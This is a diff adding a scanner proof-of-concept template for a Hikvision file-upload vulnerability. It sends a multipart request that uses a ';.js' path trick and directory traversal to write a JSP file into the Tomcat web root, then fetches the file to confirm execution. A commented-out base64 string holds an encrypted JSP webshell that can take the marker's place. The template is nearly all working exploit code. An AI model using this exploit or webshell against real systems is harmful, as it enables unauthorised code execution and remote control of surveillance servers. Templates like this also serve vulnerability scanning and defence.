@@ -1,0 +1,37 @@
+id: hikvision-files-upload
+
+info:
+  name: Hikvision Files Upload
+  author: ciyixi
+  severity: critical
+  verified: true
+  tags: hikvision,upload
+  created: 2023/06/25
+
+set:
+    rboundary: randomLowercase(8)
+    randbody: randomLowercase(32)
+    randstr: randomLowercase(10)
+    # bbody: base64Decode("PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0NCiU+PCV0cnl7Ynl0ZVtdIGRhdGE9bmV3IGJ5dGVbSW50ZWdlci5wYXJzZUludChyZXF1ZXN0LmdldEhlYWRlcigiQ29udGVudC1MZW5ndGgiKSldO2phdmEuaW8uSW5wdXRTdHJlYW0gaW5wdXRTdHJlYW09IHJlcXVlc3QuZ2V0SW5wdXRTdHJlYW0oKTtpbnQgX251bT0wO3doaWxlICgoX251bSs9aW5wdXRTdHJlYW0ucmVhZChkYXRhLF9udW0sZGF0YS5sZW5ndGgpKTxkYXRhLmxlbmd0aCk7ZGF0YT14KGRhdGEsIGZhbHNlKTtpZiAoc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInBheWxvYWQiKT09bnVsbCl7c2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInBheWxvYWQiLG5ldyBYKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5RKGRhdGEpKTt9ZWxzZXtyZXF1ZXN0LnNldEF0dHJpYnV0ZSgicGFyYW1ldGVycyIsIGRhdGEpO09iamVjdCBmPSgoQ2xhc3Mpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInBheWxvYWQiKSkubmV3SW5zdGFuY2UoKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7Zi5lcXVhbHMoYXJyT3V0KTtmLmVxdWFscyhwYWdlQ29udGV4dCk7Zi50b1N0cmluZygpO3Jlc3BvbnNlLmdldE91dHB1dFN0cmVhbSgpLndyaXRlKHgoYXJyT3V0LnRvQnl0ZUFycmF5KCksIHRydWUpKTt9IH1jYXRjaCAoRXhjZXB0aW9uIGUpe30NCiU+")
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/center/api/files;.js"
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"upload\";filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{randstr}}.jsp\"\r\n\
+        Content-Type:image/jpeg\r\n\
+        \r\n\
+        <%out.println(\"{{randbody}}\");%>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /clusterMgr/{{randstr}}.jsp;.js
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
